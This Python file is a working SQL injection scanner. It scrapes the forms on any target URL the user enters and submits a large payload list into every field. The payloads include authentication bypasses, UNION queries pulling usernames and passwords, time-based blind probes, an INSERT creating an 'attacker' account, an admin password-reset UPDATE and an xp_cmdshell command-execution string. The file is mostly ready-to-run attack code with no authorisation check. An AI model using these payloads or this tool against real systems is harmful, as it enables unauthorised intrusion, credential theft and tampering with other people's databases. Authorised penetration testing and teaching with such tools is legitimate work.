import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time
import re

# Expanded list of SQL injection payloads
payloads = [
    # Basic SQL Injection payloads
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR 1=1--",
    "' OR ''='",
    
    # Error-based SQL Injection
    "' OR 1=1; -- ",
    "' OR 1=1; #",
    "' OR '1'='1'--",
    "' AND 1=1--",
    "' AND 1=0--",
    "' AND 1=1#",
    
    # Union-based SQL Injection
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL, table_name FROM information_schema.tables--",
    
    # Time-based Blind SQL Injection (MySQL)
    "' OR SLEEP(5)--",
    "' OR IF(1=1, SLEEP(5), 0)--",
    
    # Time-based Blind SQL Injection (MSSQL)
    "'; WAITFOR DELAY '0:0:5'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    
    # Time-based Blind SQL Injection (PostgreSQL)
    "'; SELECT pg_sleep(5)--",
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    
    # Error-based SQL Injection (MySQL)
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    "' AND 1=CONVERT(int, 'test')--",
    
    # SQL Injection for Microsoft SQL Server
    "' OR 1=CONVERT(INT, @@version)--",
    "' OR 'a' = 'a'--",
    
    # Boolean-based Blind SQL Injection
    "' AND 1=1--",
    "' AND 1=2--",
    
    # Payloads to detect SQL injection on INSERT queries
    "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",
    
    # Payloads to detect SQL injection in UPDATE queries
    "'; UPDATE users SET password='newpassword' WHERE username='admin'--",
    
    # Generic payloads to test for deep input field vulnerabilities
    "') OR ('1'='1",
    "')) OR ((1=1))--",
    
    # Oracle-specific SQL Injection
    "' OR 1=1--",
    "' UNION SELECT 1,table_name FROM all_tables--",
    "' AND 1=UTL_INADDR.get_host_address('localhost')--",
    
    # PostgreSQL-specific SQL Injection
    "' UNION SELECT 1,table_name FROM information_schema.tables--",
    
    # Payloads targeting blind SQL injection
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR SLEEP(5)--",
    
    # Payloads designed to detect WAFs (Web Application Firewalls) and bypass them
    "'/**/OR/**/1/**/=/**/1",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
    
    # Time-based payloads targeting MSSQL, PostgreSQL, MySQL
    "' AND IF(1=1, SLEEP(5), 0)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "' OR benchmark(5000000,MD5(1))--"
]

# Common SQL error messages to detect
error_messages = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "syntax error",
    "ORA-01756",
    "SQLSTATE",
    "Microsoft OLE DB Provider for ODBC Drivers",
]

def is_external_url(url, base_url):
    parsed_url = urlparse(url)
    parsed_base = urlparse(base_url)
    return parsed_url.netloc and parsed_url.netloc != parsed_base.netloc

def sanitize_url_for_filename(url):
    sanitized_url = re.sub(r'[^\w\-]', '_', url)
    return sanitized_url

def scan_sql_injection(url):
    print(f"Scanning {url} for SQL Injection vulnerabilities...")

    # Create a unique log filename based on the URL
    sanitized_url = sanitize_url_for_filename(url)
    log_filename = f"scan_results_{sanitized_url}.txt"

    # Open a file to log the results specific to this URL
    with open(log_filename, 'a') as log_file:
        log_file.write(f"Starting SQL Injection scan for {url}\n\n")

    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')
    print(f"Detected {len(forms)} form(s) on {url}")

    for i, form in enumerate(forms, start=1):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        action_url = urljoin(url, action)

        if is_external_url(action_url, url):
            print(f"Skipping external form with action URL: {action_url}")
            continue

        print(f"\nForm #{i}:")
        print(f"Form action URL: {action_url}")
        print(f"Form method: {method}")

        inputs = form.find_all(['input', 'textarea'])
        input_names = [input.get('name') for input in inputs if input.get('name') and input.get('type') != 'submit']

        print(f"Input fields found: {input_names}")

        form_data = {}
        for input_field in inputs:
            input_name = input_field.get('name')
            if input_name:
                form_data[input_name] = ""

        for payload in payloads:
            for input_name in input_names:
                data = form_data.copy()
                data[input_name] = payload

                print(f"\nTesting field '{input_name}' with payload: {payload}")

                with open(log_filename, 'a') as log_file:
                    log_file.write(f"Testing field '{input_name}' with payload: {payload}\n")

                start_time = time.time()
                if method == 'post':
                    result = requests.post(action_url, data=data)
                else:
                    result = requests.get(action_url, params=data)
                end_time = time.time()

                elapsed_time = end_time - start_time
                if elapsed_time > 4:  # If it takes longer than 4 seconds, it's likely blind SQLi
                    print(f"[!] Potential Blind SQL Injection vulnerability detected in '{input_name}'")
                    with open(log_filename, 'a') as log_file:
                        log_file.write(f"[!] Potential Blind SQL Injection vulnerability detected in '{input_name}' with payload: {payload}\n")
                        log_file.write(f"Response Time: {elapsed_time} seconds\n\n")

                for error_message in error_messages:
                    if error_message.lower() in result.text.lower():
                        print(f"[!] Potential SQL Injection vulnerability detected in '{input_name}'")
                        with open(log_filename, 'a') as log_file:
                            log_file.write(f"[!] Potential SQL Injection vulnerability detected in '{input_name}' with payload: {payload}\n")
                            log_file.write(f"Error Message: {error_message}\n")
                            log_file.write(f"Response Snippet: {result.text.strip()[:200]}\n\n")
                        break
                else:
                    print(f"No SQL Injection detected for '{input_name}' with payload: {payload}")
                    with open(log_filename, 'a') as log_file:
                        log_file.write(f"No SQL Injection detected for '{input_name}' with payload: {payload}\n")

    print(f"\nScan completed for {url}. Results saved to {log_filename}.")

# Example usage
if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    scan_sql_injection(target_url)
